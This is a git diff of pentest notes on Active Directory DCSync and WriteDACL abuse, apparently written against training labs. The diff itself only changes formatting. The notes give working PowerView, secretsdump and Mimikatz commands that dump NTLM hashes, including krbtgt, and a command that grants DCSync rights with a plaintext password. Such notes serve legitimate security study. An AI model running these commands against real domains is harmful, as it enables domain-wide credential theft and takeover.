@@ -10,18 +10,20 @@ Hard to prevent and detec.
 
 ### What is a DCSync attack
 
-DCSync is a attack for stealing the Active Directory password database by using the Directory Replication Service Remote Protocol. This allows an attacker to mimic a Domain Controller to retrieve all the user NTLM password hashes.
+DCSync is a attack for stealing the Active Directory password database by using the Directory Replication Service Remote Protocol. This allows an attacker to mimic a Domain Controller to retrieve all the user NTLM password hashes.&#x20;
 
 To perfrom this attack you need the rights:
 
 * Replicating Directory Changes
 * Replciating Directory Changes all
 
+<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption><p>Its commond to find these right enabled.</p></figcaption></figure>
+
 #### Use powershell to check for Replication rights
 
 First retrieve the user's SID and then use Get-ObjectAcl to check or Replication rights
 
-```bash
+```powershell
 Get-DomainUser -Identity mczen  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
 $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
 Get-ObjectAcl "DC=zencorp,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
@@ -42,7 +44,7 @@ ObjectAceType         : DS-Replication-Get-Changes-All
 
 ### The DCSync attack
 
-DCSync replication can be done by several tools. Runnings these tools and performing the DCSync attack will result in extracting NTLM hashes.
+DCSync replication can be done by several tools. Runnings these tools and performing the DCSync attack will result in extracting NTLM hashes.&#x20;
 
 #### Secretsdump
 
@@ -58,9 +60,9 @@ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172
 
 #### Mimikatz
 
-When using Mimikatz we have to target a user and must ben run by the user who has the DCSync privileges.
+When using Mimikatz we have to target a user and must ben run by the user who has the DCSync privileges.&#x20;
 
-```bash
+```powershell
 # Using mimikatz.ps1
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
@@ -75,7 +77,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 ### <mark style="color:yellow;">WriteDACL</mark>
 
-The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges.
+The WriteDACL privilege gives a user the ability to add ACLs to an object. This means that we can add a user to this group and give them DCSync privileges.&#x20;
 
 * ACL: Acces Control Lists defines who has access to which asset or resource.
 * ACE: Acces Control Entries stores ACL settings.
@@ -83,7 +85,7 @@ The WriteDACL privilege gives a user the ability to add ACLs to an object. This 
 
 Using powershell we can use these WriteDACL rights to add DCSync privileges to an aacount.
 
-```bash
+```powershell
 # Create credential object
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
@@ -91,3 +93,4 @@ $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $S
 # Add DCSynce privilgess
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
 ```
+
